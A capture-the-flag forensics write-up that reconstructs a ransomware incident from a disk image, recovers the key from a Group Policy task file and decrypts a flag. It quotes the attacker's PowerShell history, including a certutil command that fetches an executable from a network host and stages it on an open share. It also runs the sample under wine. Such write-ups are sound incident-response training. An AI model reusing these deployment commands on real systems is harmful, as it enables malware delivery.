# RanWide

Co-authors: @Eki, @Xyzst

We are given two `.E01` files. We focus on the second one:

```shell
7z x RanWide.zip
cd artifacts
mkdir shr-srv01-mnt
ewfmount shr-srv01.E01 shr-srv01-mnt
cp shr-srv01-mnt/ewf1 shr-srv01.img
sudo losetup -P -f shr-srv01.img
mkdir mnt
sudo mount -o ro /dev/loop1 mnt
```

@eki found clues in `Users/tcollins/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt` of the ransomware:

```shell
New-Item -Path "C:\Deployment" -ItemType Directory
New-SmbShare -Name "Deploy" -Path "C:\Deployment" -FullAccess "Everyone" -Description "Deployment Scripts"
certutil.exe -urlcache -f "http://10.3.90.1/SearchIndexer.exe" "C:\Users\Public\Documents\SearchIndexer.exe"
Copy-Item -Path "C:\Users\Public\Documents\SearchIndexer.exe" -Destination "\\SHR-SRV01\Deploy\SearchIndexer.exe"
```

We decompiled the ransomware, and found its logic (contributed by @Xyzst):

1. read a 32 byte key from argv
2. compute its sha256 for salt, use pbkdf2 to derive key, then compute iv using sha256 of key and salt
3. use AES-CTR to encrypt/decrypt the files

The 32 byte key can be found in `ProgramData/Microsoft/Group Policy/History/{DF23E480-0AAB-4A4A-8480-E1AF6E5F00EB}/Machine/Preferences/ScheduledTasks/ScheduledTasks.xml`:

```xml
<Command>\\SHR-SRV01\Deploy\SearchIndexer.exe </Command>
<Arguments>&quot;7kX#mP2$vL9@wQ4!nR8*jT6%hS1^dF3&amp;&quot;</Arguments></Exec></Actions></Task></Properties></ImmediateTaskV2></ScheduledTasks>
```

So the argument is `7kX#mP2$vL9@wQ4!nR8*jT6%hS1^dF3&`. Then, we can find the key and iv.

Script by @Xyzst:

```python
import hashlib
from binascii import hexlify
import sys

def pbkdf2_hmac_sha256(password, salt, iterations, dklen):
    return hashlib.pbkdf2_hmac('sha256', password, salt, iterations, dklen)

password_str = "7kX#mP2$vL9@wQ4!nR8*jT6%hS1^dF3&"
password_bytes = password_str.encode('utf-8')

# 1. Generate Salt: First 8 bytes of SHA256(password)
sha256_pass = hashlib.sha256(password_bytes).digest()
salt = sha256_pass[:8]

# 2. Derive Key: PBKDF2(pass, salt, 1000, 32)
key = pbkdf2_hmac_sha256(password_bytes, salt, 1000, 32)

# 3. Derive IV: SHA256(password + salt)[:16]
iv_buffer = password_bytes + salt
iv_hash = hashlib.sha256(iv_buffer).digest()
iv = iv_hash[:16]

print(f"Password: {password_str}")
print(f"Length: {len(password_str)}")
print(f"Salt: {hexlify(salt).decode()}")
print(f"Key: {hexlify(key).decode()}")
print(f"IV: {hexlify(iv).decode()}")
```

Then we can decrypt the `./Users/tcollins/Desktop/flag.txt.r47m02d16` given the known key and iv.

Actually, we used a simpler way to do this, but remember to backup your files on `C:\` first (we used wine, so `~/.wine/drive_c`): 

1. copy `flag.txt.r47m02d16` to `C:\` drive, rename it to strip the suffix
2. run `wine SearchIndexer.exe '7kX#mP2$vL9@wQ4!nR8*jT6%hS1^dF3&'`
3. due to how AES-CTR works, the encrypted file now contains the flag itself
